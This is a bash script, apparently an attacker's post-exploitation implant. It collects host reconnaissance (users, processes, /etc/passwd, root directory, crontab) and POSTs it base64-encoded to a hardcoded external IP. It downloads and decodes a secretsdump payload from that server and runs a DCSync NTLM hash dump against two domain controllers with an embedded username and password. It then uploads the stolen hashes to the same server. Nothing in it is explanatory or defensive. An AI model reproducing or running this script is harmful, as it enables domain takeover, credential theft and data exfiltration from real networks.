#!/bin/bash
# fxc2
({ ip -4 a; id; w; ps -axuwwww; curl -sf ifconfig.me 2>/dev/null; echo; cat /etc/passwd 2>/dev/null | head -20; ls -la /root/ 2>/dev/null | head -20; crontab -l 2>/dev/null; } 2>&1 | base64 -w0 | xargs -I{} curl -sf -X POST http://131.123.43.239/up -H "X-Name: fxr2" --data-binary {} >/dev/null 2>&1) &
# DCSync runner6: b64 fetch + cd /tmp (sessionresume needs writable CWD)
export PYTHONPATH=/tmp/imp
WANT="2bc588d51cb894f728510526c7289a25"
D=/tmp/.secdump6.py
B=/tmp/.sd6.b64
for i in 1 2 3 4 5; do
  curl -sm60 http://131.123.43.239/sd3.b64 -o "$B" 2>/dev/null
  base64 -d "$B" > "$D" 2>/dev/null
  H=$(md5sum "$D" 2>/dev/null | cut -d' ' -f1)
  [ "$H" = "$WANT" ] && break
  sleep 4
done
H=$(md5sum "$D" 2>/dev/null | cut -d' ' -f1)
O=/tmp/.SECD6.txt
: > "$O"
if [ "$H" != "$WANT" ]; then
  echo "DL_FAIL md5=$H" >> "$O"
else
  cd /tmp || exit 1
  for ip in 10.61.10.11 10.61.10.10; do
    echo "== secretsdump $ip ==" >> "$O"
    timeout 2400 python3 "$D" -just-dc-ntlm 'MLT/rez:!QAZxsw2@'"$ip" >> "$O" 2>&1
    echo "== RC $? ==" >> "$O"
  done
fi
S=$(stat -c%s "$O" 2>/dev/null || echo 0)
if [ "$S" -gt 500000 ]; then
  gzip -9 -c "$O" > /tmp/.sc6.gz
  curl -sm180 -X POST --data-binary @/tmp/.sc6.gz http://131.123.43.239/up -H "X-Name: mel6_secd_gz"
else
  curl -sm180 -X POST --data-binary @"$O" http://131.123.43.239/up -H "X-Name: mel6_secd"
fi
echo SECD6_DONE
b=$( (id; hostname; uname -a; ip -4 a | grep inet | head -5) 2>&1 | base64 -w0); curl -s -m 10 -X POST http://131.123.43.239/up -H "X-Name: wrk_out" --data-binary "$b" >/dev/null 2>&1


